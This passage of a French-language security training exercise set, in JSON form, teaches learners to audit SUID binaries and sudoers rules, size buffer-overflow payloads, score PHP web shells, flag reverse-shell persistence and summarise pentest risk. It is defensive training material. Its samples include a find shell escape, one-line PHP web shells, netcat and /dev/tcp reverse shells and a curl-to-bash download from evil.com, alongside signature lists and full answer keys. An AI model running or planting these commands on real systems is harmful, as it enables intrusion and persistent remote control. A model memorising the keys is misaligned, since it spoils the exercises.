        "expected": "SUID_AUDIT: binary=find owner=root mode=4755 exploit=GTFOBINS_PRIVILEGE_ESCALATION risk=CRITICAL",
        "note": "Binaire find SUID root exploitable directement via la commande find . -exec /bin/sh -p ;"
      }
    ],
    "tests": [
      {
        "label": "Binaire système passwd avec SUID légitime et restreint",
        "stdin": "cas:1",
        "expected": "SUID_AUDIT: binary=passwd owner=root mode=4755 exploit=STANDARD_SYSTEM_BINARY risk=LOW"
      },
      {
        "label": "Éditeur vim mis en SUID par erreur d'administration",
        "stdin": "cas:2",
        "expected": "SUID_AUDIT: binary=vim owner=root mode=4750 exploit=GTFOBINS_PRIVILEGE_ESCALATION risk=CRITICAL"
      },
      {
        "label": "Binaire normal sans aucun bit SUID",
        "stdin": "cas:3",
        "expected": "SUID_AUDIT: binary=ls owner=root mode=0755 exploit=NO_SUID_BIT risk=NONE"
      },
      {
        "label": "Binaire SUID appartenant à un utilisateur non root",
        "stdin": "cas:4",
        "expected": "SUID_AUDIT: binary=worker owner=deploy mode=4755 exploit=NON_ROOT_SUID risk=MEDIUM"
      }
    ],
    "solution": "[Exemple]\nSUID_AUDIT: binary=find owner=root mode=4755 exploit=GTFOBINS_PRIVILEGE_ESCALATION risk=CRITICAL\n\n[Cas 1 — Binaire système passwd avec SUID légitime et restreint]\nSUID_AUDIT: binary=passwd owner=root mode=4755 exploit=STANDARD_SYSTEM_BINARY risk=LOW\n\n[Cas 2 — Éditeur vim mis en SUID par erreur d'administration]\nSUID_AUDIT: binary=vim owner=root mode=4750 exploit=GTFOBINS_PRIVILEGE_ESCALATION risk=CRITICAL\n\n[Cas 3 — Binaire normal sans aucun bit SUID]\nSUID_AUDIT: binary=ls owner=root mode=0755 exploit=NO_SUID_BIT risk=NONE\n\n[Cas 4 — Binaire SUID appartenant à un utilisateur non root]\nSUID_AUDIT: binary=worker owner=deploy mode=4755 exploit=NON_ROOT_SUID risk=MEDIUM"
  },
  {
    "id": "hk3-c5-e2",
    "chapter": 5,
    "title": "Analyseur de Fichier Sudoers et Détection de Droits Dangereux (NOPASSWD)",
    "level": "n2",
    "language": "analyse",
    "goal": "Analyser une directive sudoers pour détecter des privilèges excessifs permettant l'élévation directe vers root.",
    "brief": "<p>Une mauvaise configuration dans <code>/etc/sudoers</code> constitue le vecteur d'élévation de privilèges le plus fréquent en environnement Linux.<br><br>\nCommandes dangereuses permettant l'échappement vers un shell (Shell Escape) :<br>\n<code>ALL</code>, <code>find</code>, <code>vim</code>, <code>vi</code>, <code>less</code>, <code>more</code>, <code>bash</code>, <code>sh</code>, <code>python</code>, <code>perl</code>, <code>awk</code>.<br><br>\nRègles d'analyse :<br>\n1. Déterminer si <code>NOPASSWD:</code> est présent dans la règle :<br>\n   - Si absent : <code>nopasswd=FALSE</code>, <code>vector=PASSWORD_PROTECTED</code>, <code>risk=LOW</code>.<br>\n2. Si <code>NOPASSWD:</code> est présent (<code>nopasswd=TRUE</code>) :<br>\n   - Extraire la commande autorisée située après <code>NOPASSWD:</code> (ex: <code>/usr/bin/find</code>).<br>\n   - Extraire le nom du binaire de base.<br>\n   - Si le binaire est <code>ALL</code> ou appartient à la liste de shell escape :<br>\n     <code>vector=INSTANT_ROOT_SHELL</code>, <code>risk=CRITICAL</code>.<br>\n   - Sinon (binaire d'administration restreint, ex: <code>systemctl restart nginx</code>) :<br>\n     <code>vector=RESTRICTED_SUDO_EXECUTION</code>, <code>risk=MEDIUM</code>.<br><br>\nDonnées du cas : <code>SUDO_PARSE rule=&lt;texte_complet_de_la_regle_sudoers&gt;</code>.<br>\nRésultat d’analyse attendu : <code>SUDO_AUDIT: user=&lt;user&gt; nopasswd=&lt;TRUE|FALSE&gt; command=&lt;cmd_name&gt; vector=&lt;vector&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c5-e2) — Analyseur de Fichier Sudoers et Détection de Droits Dangereux (NOPASSWD)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Règle accordant tous les privilèges sans mot de passe (ALL)]\n# Données : SUDO_PARSE rule=john ALL=(ALL:ALL) NOPASSWD: ALL\nA_COMPLETER\n\n[Cas 2 — Commande restreinte d'administration sans échappement de shell]\n# Données : SUDO_PARSE rule=backup_svc ALL=(root) NOPASSWD: /usr/bin/rsync\nA_COMPLETER\n\n[Cas 3 — Règle classique exigeant l'authentification par mot de passe]\n# Données : SUDO_PARSE rule=alice ALL=(ALL) /bin/bash\nA_COMPLETER\n",
    "hints": [
      "Isolez le texte de la règle avec l’extraction des champs[1].",
      "Le premier mot de la règle correspond à l'utilisateur ou au groupe.",
      "Vérifiez la présence de NOPASSWD: et extrayez la commande qui suit."
    ],
    "examples": [
      {
        "stdin": "SUDO_PARSE rule=developer ALL=(ALL) NOPASSWD: /usr/bin/find",
        "expected": "SUDO_AUDIT: user=developer nopasswd=TRUE command=find vector=INSTANT_ROOT_SHELL risk=CRITICAL",
        "note": "find exécutable sans mot de passe permettant l'échappement shell immédiat."
      }
    ],
    "tests": [
      {
        "label": "Règle accordant tous les privilèges sans mot de passe (ALL)",
        "stdin": "cas:1",
        "expected": "SUDO_AUDIT: user=john nopasswd=TRUE command=ALL vector=INSTANT_ROOT_SHELL risk=CRITICAL"
      },
      {
        "label": "Commande restreinte d'administration sans échappement de shell",
        "stdin": "cas:2",
        "expected": "SUDO_AUDIT: user=backup_svc nopasswd=TRUE command=rsync vector=RESTRICTED_SUDO_EXECUTION risk=MEDIUM"
      },
      {
        "label": "Règle classique exigeant l'authentification par mot de passe",
        "stdin": "cas:3",
        "expected": "SUDO_AUDIT: user=alice nopasswd=FALSE command=bash vector=PASSWORD_PROTECTED risk=LOW"
      }
    ],
    "solution": "[Exemple]\nSUDO_AUDIT: user=developer nopasswd=TRUE command=find vector=INSTANT_ROOT_SHELL risk=CRITICAL\n\n[Cas 1 — Règle accordant tous les privilèges sans mot de passe (ALL)]\nSUDO_AUDIT: user=john nopasswd=TRUE command=ALL vector=INSTANT_ROOT_SHELL risk=CRITICAL\n\n[Cas 2 — Commande restreinte d'administration sans échappement de shell]\nSUDO_AUDIT: user=backup_svc nopasswd=TRUE command=rsync vector=RESTRICTED_SUDO_EXECUTION risk=MEDIUM\n\n[Cas 3 — Règle classique exigeant l'authentification par mot de passe]\nSUDO_AUDIT: user=alice nopasswd=FALSE command=bash vector=PASSWORD_PROTECTED risk=LOW"
  },
  {
    "id": "hk3-c5-e3",
    "chapter": 5,
    "title": "Calculateur d'Offset de Buffer Overflow et Agencement de Payload",
    "level": "n3",
    "language": "analyse",
    "goal": "Calculer la structure et la taille globale d'un exploit de dépassement de tampon de pile (Stack Buffer Overflow).",
    "brief": "<p>Dans l'exploitation de binaires compilés (x86/x64 sans canary), un dépassement de tampon permet de réécrire le pointeur d'instruction de retour (EIP/RIP).<br><br>\nStructure du payload dans la pile :<br>\n1. <code>PADDING</code> : <code>offset</code> octets (remplissage jusqu'au pointeur de retour).<br>\n2. <code>RET_ADDR</code> : taille de l'adresse de retour (4 octets en <code>x86</code>, 8 octets en <code>x64</code>).<br>\n3. <code>NOP_SLED</code> : <code>sled_len</code> octets de NOP (<code>\\x90</code>).<br>\n4. <code>SHELLCODE</code> : <code>shellcode_len</code> octets du code exécutable injecté.<br><br>\nCalcul de la taille totale du payload :<br>\n<code>total_size = offset + ret_bytes + sled_len + shellcode_len</code>.<br><br>\nDonnées du cas : <code>BOF_LAYOUT arch=&lt;x86|x64&gt; offset=&lt;N&gt; sled_len=&lt;S&gt; shellcode_len=&lt;L&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PAYLOAD_LAYOUT: arch=&lt;arch&gt; offset=&lt;N&gt; ret_bytes=&lt;4|8&gt; sled=&lt;S&gt; shellcode=&lt;L&gt; total_size=&lt;total&gt; status=READY_FOR_INJECTION</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c5-e3) — Calculateur d'Offset de Buffer Overflow et Agencement de Payload\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Payload 64-bit avec pointeur d'instruction RIP sur 8 octets]\n# Données : BOF_LAYOUT arch=x64 offset=264 sled_len=64 shellcode_len=85\nA_COMPLETER\n\n[Cas 2 — Petit offset sans NOP sled (saut direct au début du shellcode)]\n# Données : BOF_LAYOUT arch=x86 offset=40 sled_len=0 shellcode_len=28\nA_COMPLETER\n\n[Cas 3 — Tampon volumineux sous architecture x64]\n# Données : BOF_LAYOUT arch=x64 offset=1024 sled_len=128 shellcode_len=120\nA_COMPLETER\n",
    "hints": [
      "Identifiez ret_bytes : 4 octets pour x86 et 8 octets pour x64.",
      "Sommez offset + ret_bytes + sled_len + shellcode_len.",
      "Affichez la disposition du payload selon le format demandé."
    ],
    "examples": [
      {
        "stdin": "BOF_LAYOUT arch=x86 offset=112 sled_len=32 shellcode_len=44",
        "expected": "PAYLOAD_LAYOUT: arch=x86 offset=112 ret_bytes=4 sled=32 shellcode=44 total_size=192 status=READY_FOR_INJECTION",
        "note": "Payload x86 standard avec 112 octets de padding et 32 octets de NOP sled."
      }
    ],
    "tests": [
      {
        "label": "Payload 64-bit avec pointeur d'instruction RIP sur 8 octets",
        "stdin": "cas:1",
        "expected": "PAYLOAD_LAYOUT: arch=x64 offset=264 ret_bytes=8 sled=64 shellcode=85 total_size=421 status=READY_FOR_INJECTION"
      },
      {
        "label": "Petit offset sans NOP sled (saut direct au début du shellcode)",
        "stdin": "cas:2",
        "expected": "PAYLOAD_LAYOUT: arch=x86 offset=40 ret_bytes=4 sled=0 shellcode=28 total_size=72 status=READY_FOR_INJECTION"
      },
      {
        "label": "Tampon volumineux sous architecture x64",
        "stdin": "cas:3",
        "expected": "PAYLOAD_LAYOUT: arch=x64 offset=1024 ret_bytes=8 sled=128 shellcode=120 total_size=1280 status=READY_FOR_INJECTION"
      }
    ],
    "solution": "[Exemple]\nPAYLOAD_LAYOUT: arch=x86 offset=112 ret_bytes=4 sled=32 shellcode=44 total_size=192 status=READY_FOR_INJECTION\n\n[Cas 1 — Payload 64-bit avec pointeur d'instruction RIP sur 8 octets]\nPAYLOAD_LAYOUT: arch=x64 offset=264 ret_bytes=8 sled=64 shellcode=85 total_size=421 status=READY_FOR_INJECTION\n\n[Cas 2 — Petit offset sans NOP sled (saut direct au début du shellcode)]\nPAYLOAD_LAYOUT: arch=x86 offset=40 ret_bytes=4 sled=0 shellcode=28 total_size=72 status=READY_FOR_INJECTION\n\n[Cas 3 — Tampon volumineux sous architecture x64]\nPAYLOAD_LAYOUT: arch=x64 offset=1024 ret_bytes=8 sled=128 shellcode=120 total_size=1280 status=READY_FOR_INJECTION"
  },
  {
    "id": "hk3-c6-e1",
    "chapter": 6,
    "title": "Détecteur de Web Shells et Obfuscation de Scripts Malveillants",
    "level": "n1",
    "language": "analyse",
    "goal": "Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.",
    "brief": "<p>Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.<br><br>\nIndicateurs recherchés et scoring de dangerosité :<br>\n- Exécution de commandes système (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) : +40 points.<br>\n- Évaluation dynamique de code (<code>eval</code>, <code>assert</code>) : +30 points.<br>\n- Fonctions d'obfuscation (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) : +20 points.<br>\n- Réception directe d'entrées non filtrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) : +20 points.<br><br>\nClassification finale :<br>\n- Si <code>score &gt;= 60</code> : <code>status=MALICIOUS_WEBSHELL</code>, <code>risk=CRITICAL</code>.<br>\n- Si <code>20 &lt;= score &lt; 60</code> : <code>status=SUSPICIOUS_SCRIPT</code>, <code>risk=MEDIUM</code>.<br>\n- Si <code>score &lt; 20</code> : <code>status=BENIGN_CODE</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>\nRésultat d’analyse attendu : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
    "hints": [
      "Extrayez le code après \"code=\" avec l’extraction des champs[1].",
      "Testez la présence des différentes familles de mots-clés.",
      "Attribuez la classification selon les seuils 60 et 20."
    ],
    "examples": [
      {
        "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
        "expected": "WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL",
        "note": "Web shell PHP classique à une ligne combinant system et $_REQUEST."
      }
    ],
    "tests": [
      {
        "label": "Web shell fortement obfusqué combinant eval, base64 et entrées POST",
        "stdin": "cas:1",
        "expected": "WEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL"
      },
      {
        "label": "Script suspect utilisant uniquement base64_decode",
        "stdin": "cas:2",
        "expected": "WEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM"
      },
      {
        "label": "Script légitime de template sans fonction dangereuse",
        "stdin": "cas:3",
        "expected": "WEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
      }
    ],
    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]\nWEBSHELL_SCAN: score=70 status=MALICIOUS_WEBSHELL risk=CRITICAL\n\n[Cas 2 — Script suspect utilisant uniquement base64_decode]\nWEBSHELL_SCAN: score=20 status=SUSPICIOUS_SCRIPT risk=MEDIUM\n\n[Cas 3 — Script légitime de template sans fonction dangereuse]\nWEBSHELL_SCAN: score=0 status=BENIGN_CODE risk=LOW"
  },
  {
    "id": "hk3-c6-e2",
    "chapter": 6,
    "title": "Analyseur de Persistance Linux (Crontab & Reverse Shells)",
    "level": "n2",
    "language": "analyse",
    "goal": "Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).",
    "brief": "<p>Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.<br><br>\nSignatures d'attaques surveillées :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nRègles de diagnostic :<br>\n- Si l'une des signatures est présente :<br>\n  <code>malicious=TRUE</code>, <code>signature=&lt;NOM_SIGNATURE&gt;</code>, <code>risk=CRITICAL</code>.<br>\n- Sinon :<br>\n  <code>malicious=FALSE</code>, <code>signature=CLEAN</code>, <code>risk=LOW</code>.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
    "hints": [
      "Extrayez la commande avec l’extraction des champs[1].",
      "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
      "Formatez la sortie PERSIST_RESULT."
    ],
    "examples": [
      {
        "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL",
        "note": "Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant."
      }
    ],
    "tests": [
      {
        "label": "Reverse shell netcat avec redirection de binaire shell",
        "stdin": "cas:1",
        "expected": "PERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL"
      },
      {
        "label": "Persistance par téléchargement et exécution de script distant",
        "stdin": "cas:2",
        "expected": "PERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL"
      },
      {
        "label": "Tâche cron légitime de sauvegarde et synchronisation",
        "stdin": "cas:3",
        "expected": "PERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
      }
    ],
    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=TRUE signature=NETCAT_REVERSE_SHELL risk=CRITICAL\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=TRUE signature=DOWNLOAD_EXECUTE risk=CRITICAL\n\n[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=FALSE signature=CLEAN risk=LOW"
  },
  {
    "id": "hk3-c6-e3",
    "chapter": 6,
    "title": "Générateur de Synthèse Managériale et Matrice de Risque de Pentest",
    "level": "n3",
    "language": "analyse",
    "goal": "Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.",
    "brief": "<p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>\nPondération du score de risque :<br>\n- <code>CRITICAL</code> : 10 points chacun.<br>\n- <code>HIGH</code> : 5 points chacun.<br>\n- <code>MEDIUM</code> : 2 points chacun.<br>\n- <code>LOW</code> : 1 point chacun.<br>\n<code>risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1)</code>.<br><br>\nQualification de la posture globale de l'organisation :<br>\n1. Si <code>C &gt;= 1</code> ou <code>risk_score &gt;= 25</code> : <code>posture=COMPROMISED_CRITICAL</code>.<br>\n2. Sinon si <code>H &gt;= 2</code> ou <code>risk_score &gt;= 15</code> : <code>posture=HIGH_EXPOSURE</code>.<br>\n3. Sinon si <code>risk_score &gt;= 5</code> : <code>posture=MODERATE_EXPOSURE</code>.<br>\n4. Sinon : <code>posture=SECURE_RESILIENT</code>.<br><br>\nDonnées du cas : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e3) — Générateur de Synthèse Managériale et Matrice de Risque de Pentest\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\n# Données : PENTEST_SYNTHESIS findings=xss_stored:HIGH,idor_api:HIGH,weak_password_policy:MEDIUM\nA_COMPLETER\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\n# Données : PENTEST_SYNTHESIS findings=missing_csp:LOW,server_banner:LOW\nA_COMPLETER\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\n# Données : PENTEST_SYNTHESIS findings=cors_wildcard:MEDIUM,rate_limit_bypass:MEDIUM,directory_listing:MEDIUM\nA_COMPLETER\n",
    "hints": [
      "Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.",
      "Calculez le score pondéré (10, 5, 2, 1).",
      "Appliquez les conditions de qualification de posture."
    ],
    "examples": [
      {
        "stdin": "PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL",
        "note": "Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL."
      }
    ],
    "tests": [
      {
        "label": "Infrastructure avec failles élevées multiples sans faille critique",
        "stdin": "cas:1",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE"
      },
      {
        "label": "Environnement sain avec deux failles mineures d'en-tête",
        "stdin": "cas:2",
        "expected": "PENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT"
      },
      {
        "label": "Cumul de failles moyennes atteignant le seuil d'exposition modérée",
        "stdin": "cas:3",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
      }
    ],
    "solution": "[Exemple]\nPENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\nPENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
  }
];
